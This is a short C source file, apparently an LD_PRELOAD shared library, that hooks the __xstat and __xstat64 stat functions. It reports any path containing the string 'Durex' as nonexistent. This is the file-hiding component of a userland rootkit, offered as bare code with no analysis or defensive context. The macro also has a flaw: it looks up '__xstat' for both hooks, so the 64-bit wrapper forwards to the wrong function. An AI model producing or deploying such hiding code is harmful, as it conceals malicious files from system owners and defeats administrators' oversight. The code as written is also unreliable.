#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <errno.h>
#include <string.h>

static const char	*process_to_filter = "Durex";

#define DECLARE_XSTAT(xstat, stat)\
static int (*original_##xstat)(int, const char *, struct stat *) = NULL;\
int xstat(int ver, const char *pathname, struct stat *buf){if(original_##xstat == NULL){original_##xstat = dlsym(RTLD_NEXT, "__xstat");if (original_##xstat == NULL) {fprintf(stderr, "Error in dlsym: %s\n", dlerror());return -1;}}if (strstr(pathname, process_to_filter)){errno = ENOENT;return -1;}return original_##xstat(ver, pathname, buf);}

DECLARE_XSTAT(__xstat64, stat64);
DECLARE_XSTAT(__xstat, stat);
